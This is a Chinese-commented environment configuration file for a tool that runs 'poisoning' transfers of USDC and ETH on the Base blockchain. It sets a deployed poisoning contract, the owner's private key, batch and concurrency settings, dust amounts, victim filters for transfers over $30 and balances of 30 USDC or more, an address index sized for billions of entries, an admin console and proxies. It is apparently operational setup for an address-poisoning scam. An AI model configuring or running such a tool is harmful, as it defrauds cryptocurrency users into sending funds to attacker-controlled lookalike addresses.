# ==================== 数据库配置 ====================
POSTGRES_HOST=postgres
POSTGRES_PORT=5432
POSTGRES_USER=poison_db
POSTGRES_PASSWORD=CHANGE_ME_TO_STRONG_PASSWORD
POSTGRES_DB=poison_db

# ==================== 加密密钥 ====================
# 生成方法: openssl rand -hex 32
GENERATOR_MASTER_KEY=CHANGE_ME_64_HEX_CHARS_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# ==================== Base 链配置 ====================
CHAIN_ID=8453

# RPC 节点 (逗号分隔，支持多节点故障转移)
RPC_URLS=https://mainnet.base.org,https://base.publicnode.com,https://1rpc.io/base

# WebSocket 节点 (逗号分隔)
WS_URLS=wss://base.publicnode.com

# USDC 合约地址 (Base 官方 USDC, 6位小数)
USDC_CONTRACT=0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913

# 你部署的投毒合约地址
POISONER_CONTRACT=0xYOUR_CONTRACT_ADDRESS

# 合约 Owner 私钥 (不带0x前缀也行)
OWNER_PRIVATE_KEY=YOUR_PRIVATE_KEY_HERE

# ==================== 执行配置 ====================
# 批量大小
BATCH_SIZE_MIN=100
BATCH_SIZE_MAX=300
BATCH_TIMEOUT_SECONDS=30

# 并发数
MAX_CONCURRENT_BROADCASTS=10

# 投毒金额 (Base USDC 6位小数, ETH 18位小数)
USDC_AMOUNT=0.0001
ETH_AMOUNT=0.0000005

# ==================== 过滤配置 ====================
# 最小触发金额 (USD)
MIN_TRANSFER_AMOUNT_USD=30

# 目标地址最小 USDC 余额
MIN_TARGET_USDC_BALANCE=30

# ==================== 内存索引 ====================
# 是否启用全内存索引 (需要大内存，128GB+)
USE_MEMORY_INDEX=true

# 是否使用分表 (150亿+ 地址时建议开启)
USE_SHARDING=false

# ==================== Web 控制台 ====================
WEB_PORT=8083
WEB_SECRET_PATH=admin
WEB_PASSWORD=CHANGE_ME_TO_STRONG_PASSWORD

# ==================== 日志 ====================
LOG_LEVEL=info

# ==================== 代理配置 (可选) ====================
# HTTP_PROXY=http://user:pass@127.0.0.1:7890
# SOCKS5_PROXY=socks5://user:pass@127.0.0.1:1080

# ==================== 导出配置 ====================
EXPORT_PATH=/app/export

